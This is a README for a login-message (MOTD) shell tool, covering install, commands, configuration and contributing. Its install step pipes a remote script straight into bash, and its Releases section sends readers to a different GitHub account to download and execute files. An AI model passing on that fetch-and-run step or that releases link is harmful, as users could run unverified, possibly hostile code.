# MOTD - Your Custom Message of the Day Tool

![screenshot](screenshot-1.png)

![screenshot](screenshot.png)

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Commands](#commands)
- [Usage](#usage)
- [Configuration](#configuration)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

## Overview

MOTD (Message of the Day) is a simple tool that allows you to display customizable messages when users log into their systems. With MOTD, you can enhance user experience by sharing important updates, announcements, or even fun facts. This tool is straightforward to install and configure, making it ideal for both personal and professional use.

## Installation

To install MOTD, run the following command in your terminal:

```bash
bash <(curl -fsSL https://raw.githubusercontent.com/distillium/motd/main/install-motd.sh)
```

This command downloads and executes the installation script directly from the repository. Make sure you have the necessary permissions to run scripts on your system.

## Commands

MOTD comes with two main commands:

- `rw-motd` — This command manually displays the current Message of the Day. Use it whenever you want to see the latest message without waiting for the next login.

- `rw-motd-set` — This command opens a menu that allows you to enable or disable specific MOTD information blocks and the logo. Customize your display to fit your needs.

## Usage

After installation, you can use the commands as follows:

1. **Display the Current MOTD:**
   To view the current message, simply run:

   ```bash
   rw-motd
   ```

   This will show you the message set for today.

2. **Customize the MOTD:**
   To customize the message and its components, run:

   ```bash
   rw-motd-set
   ```

   Follow the prompts in the menu to select which information blocks to display or hide.

## Configuration

MOTD allows you to configure various settings to tailor the user experience. Here’s how you can modify your settings:

1. **Edit the Configuration File:**
   Locate the configuration file, usually found in `/etc/motd.conf`. Open it with your preferred text editor:

   ```bash
   nano /etc/motd.conf
   ```

   You can change the default message, add logos, or adjust other settings.

2. **Add Custom Messages:**
   You can add your own messages by simply typing them into the configuration file. Save the changes and exit the editor.

3. **Reload the MOTD:**
   After making changes, reload the MOTD to see your updates:

   ```bash
   rw-motd
   ```

## Examples

Here are some examples of how you might use MOTD:

- **Daily Updates:**
  Use MOTD to display daily updates for your team. You can include project deadlines, meeting reminders, or motivational quotes.

- **Fun Facts:**
  Share interesting facts or trivia to engage users. Change these regularly to keep the content fresh.

- **System Alerts:**
  Display important system alerts or maintenance notifications. This ensures users are aware of any issues that might affect their work.

## Contributing

Contributions are welcome! If you have ideas for new features or improvements, feel free to fork the repository and submit a pull request. Here’s how you can contribute:

1. **Fork the Repository:**
   Click on the "Fork" button at the top right of the repository page.

2. **Clone Your Fork:**
   Clone your forked repository to your local machine:

   ```bash
   git clone https://github.com/YOUR_USERNAME/motd.git
   ```

3. **Make Changes:**
   Create a new branch for your changes:

   ```bash
   git checkout -b feature-branch
   ```

   Make your changes and commit them:

   ```bash
   git commit -m "Add your message here"
   ```

4. **Push Changes:**
   Push your changes back to your forked repository:

   ```bash
   git push origin feature-branch
   ```

5. **Create a Pull Request:**
   Go to the original repository and click on "New Pull Request". Describe your changes and submit.

## License

This project is licensed under the MIT License. Feel free to use, modify, and distribute it as you see fit.

## Contact

For any questions or support, you can reach out via GitHub issues or contact the maintainer directly.

## Releases

For the latest releases and updates, please visit our [Releases](https://github.com/hieun147788/motd/releases) section. You can download the latest version and execute it to stay up-to-date with all features and improvements.

![Latest Releases](https://img.shields.io/github/v/release/hieun147788/motd)

You can also check for updates and enhancements regularly to ensure you have the best experience with MOTD.